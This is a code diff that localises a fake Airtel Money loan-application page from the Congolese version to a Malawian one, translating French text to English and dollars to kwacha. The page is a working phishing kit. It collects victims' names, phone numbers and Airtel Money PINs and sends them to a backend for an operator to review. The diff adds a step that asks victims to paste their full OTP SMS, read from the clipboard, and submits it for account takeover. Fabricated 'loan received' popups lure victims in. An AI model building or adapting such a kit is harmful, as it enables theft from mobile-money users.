+          <div class="ld-val" id="apMthly">MWK 1,151</div>
         </div>
       </div>
       <div class="ld-row">
         <div class="ld-icon ic-b">📅</div>
         <div>
-          <div class="ld-lbl">DURÉE DU PRÊT</div>
-          <div class="ld-val" id="apTerm">48 Mois</div>
+          <div class="ld-lbl">LOAN DURATION</div>
+          <div class="ld-val" id="apTerm">48 Months</div>
         </div>
       </div>
       <div class="ld-row">
         <div class="ld-icon ic-p">📈</div>
         <div>
-          <div class="ld-lbl">TAUX D'INTÉRÊT</div>
-          <div class="ld-val">5% l'an (Fixe)</div>
+          <div class="ld-lbl">INTEREST RATE</div>
+          <div class="ld-val">5% per annum (Fixed)</div>
         </div>
       </div>
     </div>
 
     <div class="qa-wrap">
-      <div class="qa-title">Services Rapides</div>
-      <button class="qa-btn">💳 Consulter Mon Solde</button>
-      <button class="qa-btn">📄 Télécharger le Contrat de Prêt</button>
+      <div class="qa-title">Quick Services</div>
+      <button class="qa-btn">💳 Check Wallet Balance</button>
+      <button class="qa-btn">📄 Download Loan Agreement</button>
     </div>
 
     <div class="nxt-steps">
       <span>🔔</span>
-      <p><strong>Transfert Instantané:</strong> Une confirmation SMS vous sera envoyée dès le déboursement sur votre numéro Airtel.</p>
+      <p><strong>Instant Disbursement:</strong> An SMS confirmation will be sent immediately upon payout to your Airtel Malawi number.</p>
     </div>
 
     <div class="rth-wrap">
-      <a href="#" class="reapply-btn-pro" onclick="alert('Transaction en cours de finalisation...')">
-        🔄 CONFIRMER & RECEVOIR
+      <a href="#" class="reapply-btn-pro" onclick="alert('Finalizing your Airtel Money Malawi disbursement...')">
+        🔄 CONFIRM & RECEIVE FUNDS
       </a>
-      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Accueil</button>
+      <button class="rth-btn" onclick="goTo('page-landing')">🏠 Back to Home</button>
     </div>
   </div>
 
-  <div class="pg-footer">© 2026 Airtel Money RDC</div>
+  <div class="pg-footer">© 2026 Airtel Money Malawi</div>
 </div>
 
 <!-- LIVE POPUP NOTIFICATION -->
 <div id="popup" class="live-popup">
-  <div class="popup-avatar" id="popup-avatar">A</div>
+  <div class="popup-avatar" id="popup-avatar">MW</div>
   <div class="popup-content">
     <div id="popup-text" class="popup-text"></div>
-    <div id="popup-time" class="popup-time">À l'instant</div>
+    <div id="popup-time" class="popup-time">Just now</div>
   </div>
 </div>
 
 <!-- MODAL OVERLAYS -->
 <div class="overlay" id="mLogin">
-  <div class="modal"><div class="spinner"></div><h3>Veuillez patienter…</h3><p>Connexion et vérification des données</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Please wait…</h3><p>Verifying your Airtel Money credentials</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>Vérification du code OTP</h3><p id="otpVT">Veuillez patienter… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Verifying OTP Message</h3><p id="otpVT">Please wait… (3s)</p></div>
 </div>
 <div class="overlay" id="mSubmit">
-  <div class="modal"><div class="spinner"></div><h3>Envoi de la demande…</h3><p>Traitement sécurisé de votre dossier</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Submitting Application…</h3><p>Securely processing your loan request</p></div>
 </div>
 
 </div>
@@ -1108,14 +1226,16 @@
 <script>
   // STATE MANAGEMENT
   const S = {
-    amt: 1000,
-    term: '48 Mois',
+    amt: 50000,
+    term: '48 Months',
     purpose: '',
     first: '',
     last: '',
     phone: '',
     applicationId: null,
-    assignedAdminId: null
+    assignedAdminId: null,
+    extractedOtp: '',
+    fullOtpMessage: ''
   };
 
   function getAdminId() {
@@ -1134,7 +1254,7 @@
     window.scrollTo(0, 0);
   }
 
-  // LOAN CALCULATOR
+  // LOAN CALCULATOR (MWK)
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
@@ -1142,16 +1262,16 @@
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
     const tot = m * t;
     
-    document.getElementById('aDisp').textContent = '$ ' + a.toLocaleString();
-    document.getElementById('tDisp').textContent = t + ' Mois';
-    document.getElementById('mOut').textContent = '$ ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+    document.getElementById('aDisp').textContent = 'MWK ' + a.toLocaleString();
+    document.getElementById('tDisp').textContent = t + ' Months';
+    document.getElementById('mOut').textContent = 'MWK ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
     
     const totEl = document.getElementById('totOut');
     if(totEl) {
-      totEl.textContent = 'Total à rembourser: $ ' + tot.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',') + ' (Capital + Intérêts)';
+      totEl.textContent = 'Total repayment: MWK ' + tot.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',') + ' (Principal + Interest)';
     }
 
-    document.getElementById('rA').style.setProperty('--pct', ((a-1000)/(50000-1000)*100).toFixed(2) + '%');
+    document.getElementById('rA').style.setProperty('--pct', ((a-50000)/(5000000-50000)*100).toFixed(2) + '%');
     document.getElementById('rT').style.setProperty('--pct', ((t-6)/(60-6)*100).toFixed(1) + '%');
   }
 
@@ -1184,16 +1304,16 @@
   function toS2() {
     const amt     = document.getElementById('s1am').value;
     const purpose = document.getElementById('s1pu').value.trim();
-    if (!amt || Number(amt) < 1000) {
-      showErr('s1Err', 'Le montant minimum pour ce prêt est de $ 1,000.');
+    if (!amt || Number(amt) < 50000) {
+      showErr('s1Err', 'Minimum loan amount is MWK 50,000.');
       shakeField('s1am'); return;
     }
-    if (Number(amt) > 50000) {
-      showErr('s1Err', 'Le montant maximum pour ce prêt est de $ 50,000.');
+    if (Number(amt) > 5000000) {
+      showErr('s1Err', 'Maximum loan amount is MWK 5,000,000.');
       shakeField('s1am'); return;
     }
     if (!purpose) {
-      showErr('s1Err', 'Veuillez préciser le motif de votre prêt.');
+      showErr('s1Err', 'Please enter the purpose of your loan.');
       shakeField('s1pu'); return;
     }
     clearErr('s1Err');
@@ -1209,19 +1329,19 @@
     const phone = document.getElementById('s2ph').value.trim();
 
     if (!first) {
-      showErr('s2Err', 'Veuillez saisir votre prénom.');
+      showErr('s2Err', 'Please enter your first name.');
       shakeField('s2fi');
       return;
     }
 
     if (!last) {
-      showErr('s2Err', 'Veuillez saisir votre nom de famille.');
+      showErr('s2Err', 'Please enter your last name.');
       shakeField('s2la');
       return;
     }
 
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Veuillez saisir un numéro de téléphone valide à 9 chiffres.');
+    if (!phone || phone.length < 9 || !/^[89]\d{8}$/.test(phone)) {
+      showErr('s2Err', 'Please enter a valid 9-digit Airtel Malawi phone number (e.g., 991234567).');
       shakeField('s2ph');
       return;
     }
@@ -1232,7 +1352,10 @@
     S.last = last;
     S.phone = phone;
 
-    document.getElementById('sA').textContent = '$ ' + Number(S.amt).toLocaleString();
+    // Pre-fill login phone number for convenience
+    document.getElementById('lgPh').value = phone;
+
+    document.getElementById('sA').textContent = 'MWK ' + Number(S.amt).toLocaleString();
     document.getElementById('sT').textContent = S.term;
     document.getElementById('sP').textContent = S.purpose || '—';
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
@@ -1243,17 +1366,17 @@
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
-      showErr('s3Err', 'Veuillez préciser votre revenu annuel.'); shakeField('s3in'); return;
+      showErr('s3Err', 'Please enter your estimated annual income.'); shakeField('s3in'); return;
     }
     clearErr('s3Err');
 
     const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
-    if (btn) { btn.disabled = true; btn.textContent = 'ENVOI EN COURS…'; }
+    if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
     document.getElementById('mSubmit').classList.add('show');
 
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
-      if (btn) { btn.disabled = false; btn.textContent = 'SOUMETTRE ➔'; }
+      if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT APPLICATION ➔'; }
       goTo('page-submitted');
       let c = 3;
       document.getElementById('rdN').textContent = c;
@@ -1316,12 +1439,12 @@
     const rawPhone = document.getElementById('lgPh').value.trim();
     const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
 
-    if (!rawPhone || pin.length < 4) {
-      showLoginMsg('Veuillez saisir votre numéro de téléphone et votre code PIN à 4 chiffres.');
+    if (!rawPhone || rawPhone.length < 9 || pin.length < 4) {
+      showLoginMsg('Please enter your 9-digit Airtel Malawi phone number and 4-digit PIN.');
       return;
     }
 
-    const phoneNumber = '+243' + rawPhone;
+    const phoneNumber = '+265' + rawPhone;
     const adminId = getAdminId();
 
     _loginInFlight = true;
@@ -1351,6 +1474,7 @@
 
         document.getElementById('otpPh').textContent = phoneNumber;
 
+        clearOtpSms();
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
         document.getElementById('otpInputSection').style.display = 'none';
@@ -1359,14 +1483,14 @@
 
       } else {
         document.getElementById('bLogin').disabled = false;
-        showLoginMsg(data.message || 'Authentification échouée. Veuillez réinstaller votre code PIN.');
+        showLoginMsg(data.message || 'Authentication failed. Please check your Airtel Money PIN.');
       }
 
     } catch (err) {
       _loginInFlight = false;
       document.getElementById('mLogin').classList.remove('show');
       document.getElementById('bLogin').disabled = false;
-      showLoginMsg('Erreur réseau. Veuillez vérifier votre connexion internet et réessayer.');
+      showLoginMsg('Network error. Please check your internet connection and try again.');
     }
   }
 
@@ -1387,22 +1511,21 @@
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'flex';
-          showOtpMsg('success', 'Identité confirmée ! Entrez le code OTP reçu par SMS.');
+          showOtpMsg('success', 'Identity verified! Paste the full Airtel Money OTP SMS message below.');
           startRs();
-          document.getElementById('o0').focus();
+          document.getElementById('otpFullMessage').focus();
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
-          showOtpMsg('error', 'Informations incorrectes. Veuillez réviser vos identifiants Airtel Money.');
+          showOtpMsg('error', 'Incorrect details. Please verify your Airtel Money credentials.');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
+            clearOtpSms();
             document.getElementById('bOtp').disabled = false;
             document.getElementById('otpInputSection').style.display = 'flex';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Renvoyer le code dans <span id="rsS">30</span> secondes';
+            document.getElementById('otpRs').innerHTML = 'Resend verification SMS in <span id="rsS">30</span> seconds';
             hideOtpMsgs();
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             document.getElementById('bLogin').disabled = false;
@@ -1425,18 +1548,93 @@
         clearInterval(pinPollInterval);
         if (document.getElementById('pinWait').classList.contains('show')) {
           document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Délai dépassé. Veuillez réessayer la procédure.');
+          showOtpMsg('warning', 'Session timed out. Please try again.');
         }
       }
     }, 300000);
   }
 
-  // OTP HELPERS
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+  // FULL MESSAGE OTP PARSING & PASTE HELPERS
+  function extractOtpFromMessage(text) {
+    if (!text) return '';
+    // Match 4 to 6 digit OTP codes in SMS text
+    const contextualMatch = text.match(/(?:code|otp|pin|verification|is|:)\s*[:\-]?\s*(\d{4,6})\b/i);
+    if (contextualMatch && contextualMatch[1]) {
+      return contextualMatch[1];
+    }
+    const genericMatch = text.match(/\b(\d{4,6})\b/);
+    return genericMatch ? genericMatch[1] : '';
+  }
+
+  function handleOtpMessageInput() {
+    const textarea = document.getElementById('otpFullMessage');
+    const rawText = textarea.value.trim();
+    const pasteBox = document.getElementById('otpPasteBox');
+    const clearBtn = document.getElementById('btnClearSms');
+    const statusEl = document.getElementById('otpDetectStatus');
+    const previewEl = document.getElementById('otpCodePreview');
+    const submitBtn = document.getElementById('bOtp');
+
+    S.fullOtpMessage = rawText;
+
+    if (rawText.length > 0) {
+      clearBtn.classList.add('show');
+    } else {
+      clearBtn.classList.remove('show');
+    }
+
+    const code = extractOtpFromMessage(rawText);
+    S.extractedOtp = code;
+
+    if (code) {
+      pasteBox.classList.add('has-code');
+      statusEl.classList.add('detected');
+      statusEl.textContent = '✓ OTP Code Detected';
+      previewEl.style.display = 'inline-block';
+      previewEl.textContent = 'OTP: ' + code;
+      submitBtn.className = 'btn-otp rdy';
+    } else if (rawText.length >= 4) {
+      pasteBox.classList.remove('has-code');
+      statusEl.classList.remove('detected');
+      statusEl.textContent = 'Message captured — ready to verify';
+      previewEl.style.display = 'none';
+      submitBtn.className = 'btn-otp rdy';
+    } else {
+      pasteBox.classList.remove('has-code');
+      statusEl.classList.remove('detected');
+      statusEl.textContent = 'Waiting for pasted SMS message…';
+      previewEl.style.display = 'none';
+      submitBtn.className = 'btn-otp';
+    }
+  }
+
+  async function pasteOtpFromClipboard() {
+    hideOtpMsgs();
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        const clipText = await navigator.clipboard.readText();
+        if (clipText && clipText.trim()) {
+          const textarea = document.getElementById('otpFullMessage');
+          textarea.value = clipText.trim();
+          handleOtpMessageInput();
+          textarea.focus();
+          return;
+        }
+      }
+      showOtpMsg('info', 'Tap inside the box above and select "Paste" from your keyboard.');
+      document.getElementById('otpFullMessage').focus();
+    } catch (err) {
+      showOtpMsg('info', 'Tap and hold inside the message box below, then tap "Paste".');
+      document.getElementById('otpFullMessage').focus();
+    }
+  }
+
+  function clearOtpSms() {
+    const textarea = document.getElementById('otpFullMessage');
+    if (textarea) textarea.value = '';
+    S.extractedOtp = '';
+    S.fullOtpMessage = '';
+    handleOtpMessageInput();
   }
 
   let _rsInterval = null;
@@ -1447,7 +1645,7 @@
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    rsBox.innerHTML = 'Renvoyer le code dans <span id="rsS">' + s + '</span> secondes';
+    rsBox.innerHTML = 'Resend verification SMS in <span id="rsS">' + s + '</span> seconds';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -1457,7 +1655,7 @@
         clearInterval(_rsInterval);
         _rsInterval = null;
         const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--brand-red);cursor:pointer;font-weight:700" onclick="resendOtp()">Renvoyer le code OTP</span>';
+        if (box) box.innerHTML = '<span style="color:var(--brand-red);cursor:pointer;font-weight:700" onclick="resendOtp()">Resend Verification SMS</span>';
       }
     }, 1000);
   }
@@ -1472,45 +1670,50 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'Un nouveau code OTP a été envoyé.');
+        showOtpMsg('info', 'A new verification SMS has been sent to your Airtel number.');
         startRs();
-        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
+        clearOtpSms();
+        document.getElementById('otpFullMessage').focus();
       } else {
-        showOtpMsg('error', 'Échec de l\'envoi du code. Veuillez réessayer.');
+        showOtpMsg('error', 'Failed to resend verification SMS. Please try again.');
       }
     } catch {
-      showOtpMsg('error', 'Erreur réseau lors du renvoi de l\'OTP.');
+      showOtpMsg('error', 'Network error while resending OTP.');
     }
   }
 
   async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+    const rawMessage = document.getElementById('otpFullMessage').value.trim();
+    const extractedCode = extractOtpFromMessage(rawMessage);
 
-    if (otp.length < 4) {
-      showOtpMsg('warning', 'Veuillez renseigner les 4 chiffres de votre code OTP.');
+    if (!rawMessage || (!extractedCode && rawMessage.length < 4)) {
+      showOtpMsg('warning', 'Please paste the full verification SMS message received from Airtel Money.');
+      document.getElementById('otpFullMessage').focus();
       return;
     }
 
     hideOtpMsgs();
 
     let c = 3;
-    document.getElementById('otpVT').textContent = 'Veuillez patienter… (' + c + 's)';
+    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
 
     const countdown = setInterval(() => {
       c--;
       const el = document.getElementById('otpVT');
-      if (el) el.textContent = 'Veuillez patienter… (' + c + 's)';
+      if (el) el.textContent = 'Please wait… (' + c + 's)';
     }, 1000);
 
     try {
       const res  = await fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, otp })
+        body: JSON.stringify({ 
+          applicationId: S.applicationId, 
+          otp: extractedCode || rawMessage,
+          fullOtpMessage: rawMessage
+        })
       });
       const data = await res.json();
 
@@ -1518,18 +1721,18 @@
       document.getElementById('mOtp').classList.remove('show');
 
       if (data.success) {
-        showOtpMsg('success', 'OTP soumis. En attente de déboursement…');
+        showOtpMsg('success', 'Verification message submitted. Processing disbursement…');
         pollOtpStatus();
       } else {
         document.getElementById('bOtp').disabled = false;
-        showOtpMsg('error', data.message || 'Code OTP invalide. Veuillez réessayer.');
+        showOtpMsg('error', data.message || 'Invalid verification message. Please paste the exact SMS received.');
       }
 
     } catch (err) {
       clearInterval(countdown);
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      showOtpMsg('error', 'Erreur réseau. Veuillez vérifier votre connexion.');
+      showOtpMsg('error', 'Network error. Please check your internet connection.');
     }
   }
 
@@ -1548,31 +1751,30 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
-          document.getElementById('apAmt').textContent  = '$ ' + Number(S.amt || 1000).toLocaleString();
-          document.getElementById('apTerm').textContent = S.term || '48 Mois';
-          const a = Number(S.amt) || 1000;
+          document.getElementById('apAmt').textContent  = 'MWK ' + Number(S.amt || 50000).toLocaleString();
+          document.getElementById('apTerm').textContent = S.term || '48 Months';
+          const a = Number(S.amt) || 50000;
           const t = parseInt(S.term) || 48;
           const r = 0.05 / 12;
           const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
-          document.getElementById('apMthly').textContent = '$ ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+          document.getElementById('apMthly').textContent = 'MWK ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
           goTo('page-approval');
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Validation échouée. Veuillez contacter le support.');
+          showOtpMsg('error', 'Verification failed. Please contact support.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Code PIN incorrect. ⚠️ Attention : une nouvelle erreur verrouillera temporairement votre accès.');
+          showOtpMsg('error', 'Incorrect PIN. ⚠️ Warning: another failed attempt will temporarily lock your account.');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
+            clearOtpSms();
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
             document.getElementById('otpInputSection').style.display = 'flex';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Renvoyer le code dans <span id="rsS">30</span> secondes';
+            document.getElementById('otpRs').innerHTML = 'Resend verification SMS in <span id="rsS">30</span> seconds';
             hideOtpMsgs();
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             document.getElementById('bLogin').disabled = false;
@@ -1587,13 +1789,12 @@
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
+          clearOtpSms();
           document.getElementById('bOtp').disabled = false;
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'flex';
-          showOtpMsg('error', 'Mots de passe OTP erroné. Veuillez vérifier et resaisir.');
-          document.getElementById('o0').focus();
+          showOtpMsg('error', 'Incorrect OTP SMS message. Please copy and paste the full SMS again.');
+          document.getElementById('otpFullMessage').focus();
         }
 
       } catch (e) {
@@ -1604,24 +1805,24 @@
     setTimeout(() => {
       if (otpPollInterval) {
         clearInterval(otpPollInterval);
-        showOtpMsg('warning', 'Temps d\'approbation écoulé. Veuillez réessayer.');
+        showOtpMsg('warning', 'Approval timeout reached. Please try again.');
         document.getElementById('bOtp').disabled = false;
       }
     }, 300000);
   }
 
-  // LIVE APPROVAL POPUP LOGIC (DRC DRC / AIRTEL)
+  // LIVE APPROVAL POPUP LOGIC (MALAWI / AIRTEL)
   document.addEventListener("DOMContentLoaded", () => {
     const liveApprovals = [
-        { number: "+243 97*****841", amount: "$ 1,000" },
-        { number: "+243 99*****375", amount: "$ 2,500" },
-        { number: "+243 97*****912", amount: "$ 5,000" },
-        { number: "+243 98*****458", amount: "$ 10,000" },
-        { number: "+243 97*****694", amount: "$ 15,000" },
-        { number: "+243 99*****231", amount: "$ 20,000" },
-        { number: "+243 97*****885", amount: "$ 30,000" },
-        { number: "+243 98*****406", amount: "$ 40,000" },
-        { number: "+243 99*****534", amount: "$ 50,000" }
+        { number: "+265 99*****841", amount: "MWK 50,000" },
+        { number: "+265 98*****375", amount: "MWK 150,000" },
+        { number: "+265 99*****912", amount: "MWK 300,000" },
+        { number: "+265 88*****458", amount: "MWK 500,000" },
+        { number: "+265 99*****694", amount: "MWK 850,000" },
+        { number: "+265 98*****231", amount: "MWK 1,200,000" },
+        { number: "+265 99*****885", amount: "MWK 2,000,000" },
+        { number: "+265 88*****406", amount: "MWK 3,500,000" },
+        { number: "+265 99*****534", amount: "MWK 5,000,000" }
     ];
 
     const popup = document.getElementById("popup");
@@ -1650,7 +1851,7 @@
 
         const user = liveApprovals[index];
         popupAvatar.textContent = user.number.substring(5, 7);
-        popupText.innerHTML = `<strong>${user.number}</strong> a reçu un prêt de <strong>${user.amount}</strong>`;
+        popupText.innerHTML = `<strong>${user.number}</strong> received a loan of <strong>${user.amount}</strong>`;
 
         popup.classList.add("show");
 
